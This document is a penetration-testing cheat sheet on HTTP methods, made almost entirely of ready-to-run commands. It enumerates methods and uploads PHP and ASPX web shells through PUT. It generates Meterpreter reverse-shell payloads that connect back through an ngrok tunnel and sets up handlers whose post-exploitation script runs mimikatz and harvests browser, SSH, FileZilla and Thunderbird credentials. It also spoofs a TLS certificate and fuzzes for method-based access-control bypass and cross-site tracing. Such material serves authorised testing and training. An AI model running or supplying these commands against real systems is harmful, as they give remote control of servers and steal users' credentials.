# HTTP Methods

## Check List

* [ ] _Enumerate supported HTTP methods._
* [ ] _Test for access control bypass._
* [ ] _Test XST vulnerabilities._
* [ ] _Test HTTP method overriding techniques._

## Cheat Sheet

### Discover the Supported Methods <a href="#discover-the-supported-methods" id="discover-the-supported-methods"></a>

#### [cURL](https://curl.se/)

_Check Methods_

```bash
curl -X OPTIONS -I $WEBSITE
```

_Upload phpinfo()_

```bash
curl -X PUT -d "<?php phpinfo(); ?>" $WEBSITE/phpinfo.php
```

#### [Nmap](https://nmap.org/)

```bash
nmap -sS -sV --mtu 5000 --script http-methods $WEBSITE
```

### **PUT Method**

#### [Weevely](https://github.com/epinna/weevely3)

_Create Web Shell PHP_

```bash
weevely generate 00980098 /tmp/unk9vvn.php
```

_Create Web Shell ASPX_

```bash
cp /usr/share/webshells/aspx/cmdasp.aspx /tmp/unk9vvn.aspx
```

#### [cURL](https://curl.se/)

_Upload Web Shell PHP_

<pre class="language-bash"><code class="lang-bash">curl -X PUT $WEBSITE/uploads/index.php \
<strong>     --upload-file /tmp/unk9vvn.php \
</strong>     -H "Content-Type: application/x-php"
</code></pre>

_Execute Web Shell PHP_

```bash
weevely "$WEBSITE/uploads/index.php" 00980098
```

_Upload Web Shell ASP_

```bash
curl -X PUT $WEBSITE/uploads/index.aspx \
     --upload-file /tmp/unk9vvn.aspx \
     -H "Content-Type: application/x-aspx"
```

_Execute Web Shell ASP_

```bash
curl "$WEBSITE/uploads/index.aspx?cmd=whoami"
```

#### [Metasploit](https://www.metasploit.com/)

_All Methods Scan_

```bash
msfconsole -qx "
    use auxiliary/scanner/http/options;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    run -j"
```

_PUT Method Scan_

```bash
msfconsole -qx "
    use auxiliary/scanner/http/http_put;
    set RHOSTS $WEBSITE;
    set RPORT 443;
    set SSL true;
    set PATH /uploads;
    run -j"
```

_Start Ngrok_

```bash
nohup ngrok tcp 4444 >/dev/null 2>&1 &
```

_Define ENV Ngrok_

```bash
NGINFO=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels); \
NGHOST=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/([^"]*):.*/\1/p'); \
NGPORT=$(echo "$NGINFO" | sed -nE 's/.*public_url":"tcp:\/\/.*.tcp.*.ngrok.io:([^"]*).*/\1/p')
```

_Cert Spoof_

```bash
rm -rf /home/$USER/.msf4/loot/*
msfconsole -qx "
    use auxiliary/gather/impersonate_ssl;
    set RHOSTS google.com;
    run;
    exit"
```

_Post-EXP_

```bash
cat > /tmp/post-exp.rc << EOF
getprivs
getsystem
run multi/gather/firefox_creds DECRYPT=true
run multi/gather/filezilla_client_cred
run multi/gather/ssh_creds
run multi/gather/thunderbird_creds
run multi/gather/wlan_geolocate
mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
bg
EOF
```

_Generate Web shell PHP_

```bash
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f raw \
         -e php/base64 -i 3 \
         -o /tmp/unk9vvn.php
sed -i "s#eval#<?php eval#g" /tmp/unk9vvn.php
sed -i "s#));#)); ?>#g" /tmp/unk9vvn.php
```

_Generate Web Shell ASP_

```bash
msfvenom -p windows/meterpreter/reverse_winhttps \
         LHOST=$NGHOST \
         PORT=$NGPORT \
         EnableStageEncoding=true \
         -f asp > /tmp/unk9vvn.aspx
```

_Listening Metasploit PHP_

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD php/meterpreter/reverse_tcp;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

_Listening Metaploit ASP_

```bash
msfconsole -qx "
    use multi/handler;
    set PAYLOAD windows/meterpreter/reverse_winhttps;
    set LHOST $NGHOST;
    set LPORT $NGPORT;
    set ReverseListenerBindAddress 127.0.0.1;
    set ReverseListenerBindPort 4444;
    set StageEncoder true;
    set AutoRunScript /tmp/post-exp.rc;
    run -j"
```

_Upload Shell PUT Method PHP_

```bash
curl -X PUT $WEBSITE/wp-content/uploads/index.php \
--upload-file /tmp/unk9vvn.php \
-H "Content-Type: application/x-php"
```

### Access Control Bypass <a href="#testing-for-access-control-bypass" id="testing-for-access-control-bypass"></a>

#### [Katana](https://github.com/projectdiscovery/katana) & [FFUF](https://github.com/ffuf/ffuf)

_Create Script_

```bash
sudo nano http-methods-fuzzer.sh
```

```bash
#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: $0 <WEBSITE>"
    exit 1
fi

WEBSITE="$1"

# Validate URL format
if ! [[ "$WEBSITE" =~ ^https?:// ]]; then
    echo "Error: WEBSITE must start with http:// or https://"
    exit 1
fi

# Create temporary files
KATANA_OUTPUT=$(mktemp)
URLS_FILE=$(mktemp)
COOKIE_FILE=$(mktemp)

# Cleanup function
cleanup()
{
    rm -f "$KATANA_OUTPUT" "$URLS_FILE" "$COOKIE_FILE"
}
trap cleanup EXIT

# Run katana to gather URLs
katana -u $WEBSITE \
       -fr "(static|assets|img|images|css|fonts|icons)/" \
       -o "$KATANA_OUTPUT" \
       -xhr-extraction \
       -automatic-form-fill \
       -silent \
       -strategy breadth-first \
       -js-crawl \
       -extension-filter jpg,jpeg,png,gif,bmp,tiff,tif,webp,svg,ico,css \
       -headless --no-sandbox \
       -known-files all \
       -field url \
       -sf url

# Filter and clean extracted URLs
sed -E 's/\?.*//; s/\.aspx$//; s/\/[^/]+\.json$//' "$KATANA_OUTPUT" | grep -Ev '\.js$|&amp' | sort -u > "$URLS_FILE"

# User-Agent and headers
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0"
HEADERS=(
    "User-Agent: $USER_AGENT"
    "Accept: */*"
    "Accept-Language: en-US,fa-IR;q=0.5"
    "Accept-Encoding: gzip, deflate, br, zstd"
    "Connection: keep-alive"
    "Upgrade-Insecure-Requests: 1"
    "Sec-Fetch-Dest: script"
    "Sec-Fetch-Mode: no-cors"
    "Sec-Fetch-Site: cross-site"
    "DNT: 1"
    "Sec-GPC: 1"
    "Priority: u=0, i"
    "Te: trailers"
)

# Extract cookies
COOKIES=$(curl -s -I "$WEBSITE" | awk 'BEGIN {IGNORECASE=1} /^set-cookie:/ {print substr($0, 13)}' | awk -F';' '{print $1}' | tr '\n' '; ' | sed 's/; $//')

# Append cookies if available
if [[ -n "$COOKIES" ]]; then
    HEADERS+=("Cookie: $COOKIES")
fi

# Convert headers into ffuf parameters
HEADER_PARAMS=()
for HEADER in "${HEADERS[@]}"; do
    HEADER_PARAMS+=("-H" "$HEADER")
done

# Run ffuf
echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt
ffuf -w "$URLS_FILE":URL \
     -w /tmp/methods.txt:METHODS \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -r -c -mc 200 \
     "${HEADER_PARAMS[@]}"
```

_Run Script_

```bash
sudo chmod +x http-methods-fuzzer.sh;sudo ./http-methods-fuzzer.sh $WEBSITE
```

### Cross-Site Tracing Potential <a href="#testing-for-cross-site-tracing-potential" id="testing-for-cross-site-tracing-potential"></a>

#### [FFUF](https://github.com/ffuf/ffuf)

```bash
ffuf -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X TRACE \
     -H "Custom-Test-Header: <scipt>alert('unk9vvn')</script>" \
     -r -c -mc 200 -mr "unk9vvn"
```

### HTTP Method Overriding <a href="#testing-for-http-method-overriding" id="testing-for-http-method-overriding"></a>

#### [FFUF](https://github.com/ffuf/ffuf)

_X-HTTP-Method_

```bash
echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
ffuf -w /tmp/methods.txt:METHODS \
     -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -H "X-HTTP-Method: METHODS" \
     -r -c -mc 200
```

_X-HTTP-Method-Override_

```bash
echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
ffuf -w /tmp/methods.txt:METHODS \
     -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -H "X-HTTP-Method-Override: METHODS" \
     -r -c -mc 200
```

_X-Method-Override_

```bash
echo -e "GET\nPOST\nPUT\nDELETE\nHEAD\nOPTIONS\nTRACE\nCONNECT\nPATCH" > /tmp/methods.txt; \
ffuf -w /tmp/methods.txt:METHODS \
     -w /tmp/urls.txt:URL \
     -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt:DIR \
     -u URL/DIR \
     -X METHODS \
     -H "X-Method-Override: METHODS" \
     -r -c -mc 200
```
